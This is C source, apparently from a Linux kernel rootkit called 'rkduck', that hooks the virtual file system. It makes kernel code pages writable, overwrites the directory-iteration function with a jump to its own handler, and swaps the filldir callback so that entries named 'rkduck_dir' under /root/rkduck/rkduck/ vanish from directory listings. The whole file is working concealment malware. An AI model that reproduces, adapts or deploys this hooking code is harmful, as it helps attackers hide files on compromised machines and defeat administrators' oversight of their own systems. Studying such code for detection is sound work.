#include "vfs.h"

LIST_HEAD(hooked_targets);
LIST_HEAD(hidden_files);

void vfs_hijack_start(void *target) {
    struct hook *h;

    list_for_each_entry(h, &hooked_targets, list) {
        if (target == h->target) {
            preempt_count_inc();
            barrier();
            set_page_rw((ptr_t) target);

            memcpy(target, h->hijacked_code, CODE_SIZE);

            set_page_ro((ptr_t) target);
            barrier();
            preempt_count_dec();

            break;
        }
    }
}

void vfs_hijack_stop(void *target) {
    struct hook *h;

    list_for_each_entry(h, &hooked_targets, list) {
        if (target == h->target) {
            preempt_count_inc();
            barrier();
            set_page_rw((ptr_t) target);

            memcpy(target, h->original_code, CODE_SIZE);

            set_page_ro((ptr_t) target);
            barrier();
            preempt_count_dec();

            break;
        }
    }
}

void *vfs_get_iterate(const char *path) {
    void *ret;
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    ret = file->f_op->iterate;
    filp_close(file,0);

    return ret;
}

static int vfs_hijacked_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
    char *get_protect = "rkduck_dir";

    dbg("rkduck:\n\tName: %s\n\tInode: %llu\n\td_type: %u\n\toffset: %lld\n", name, ino, d_type, offset);

    if (strstr(name, get_protect)) {
        return 0;
    }

    return vfs_original_filldir(ctx, name, namelen, offset, ino, d_type);
}

int vfs_hijacked_iterate(struct file *file, struct dir_context *ctx) {
    int ret;
    int length;
    struct dentry de;
    char *path_name = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
    char *path_name_tmp = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);

    memset(path_name, 0, PATH_MAX);
    memset(path_name_tmp, 0, PATH_MAX);
    vfs_original_filldir = ctx->actor;
    de = *(file->f_path.dentry);

    do {
        dbg("rkduck: parent file path %s\n", de.d_name.name);

        length = strlen(de.d_name.name);
        strncpy(path_name_tmp+length+1, path_name, strlen(path_name));
        strncpy(path_name_tmp+1, de.d_name.name, length);
        strncpy(path_name_tmp, "/", 1);
        strncpy(path_name, path_name_tmp, strlen(path_name_tmp));
        de = *(de.d_parent);

        dbg("rkduck: path %s\n", path_name);
    } while (strncmp(de.d_name.name, "/", 1));

    strncpy(path_name+strlen(path_name), "/", 1);
    dbg("rkduck: path %s\n", path_name);
    vfs_hijack_stop(vfs_original_iterate);

    if (!strncmp(path_name, "/root/rkduck/rkduck/", strlen("/root/rkduck/rkduck/"))) {
        *((filldir_t *)&ctx->actor) = &vfs_hijacked_filldir;
    }

    ret = vfs_original_iterate(file, ctx);
    vfs_hijack_start(vfs_original_iterate);
    kfree(path_name);
    kfree(path_name_tmp);

    return ret;
}

void vfs_save_hijacked_function_code(void *target, void *new) {
    int i=0;
    struct hook *h;
    unsigned char hijacked_code[CODE_SIZE];
    unsigned char original_code[CODE_SIZE];

    dbg("rkduck: vfs_hijacked_iterate %p\n", vfs_hijacked_iterate);

    memcpy(hijacked_code, HIJACKED_CODE, CODE_SIZE);
    *(ptr_t *) &hijacked_code[POINTER_OFFSET] = (ptr_t) new;
    memcpy(original_code, target, CODE_SIZE);

    dbg("rkduck dump: hijacked code ");
    for(i=0; i<CODE_SIZE; i++)
        dbg("%02x", *((unsigned char *)hijacked_code+i) );
    dbg("\n");

    dbg("rkduck dump: original code ");
    for(i=0; i<CODE_SIZE; i++)
        dbg("%02x", *((unsigned char *)original_code+i) );
    dbg("\n");

    h = kmalloc(sizeof(struct hook), GFP_KERNEL);
    h->target = target;
    memcpy(h->hijacked_code, hijacked_code, CODE_SIZE);
    memcpy(h->original_code, original_code, CODE_SIZE);

    list_add(&h->list, &hooked_targets);
}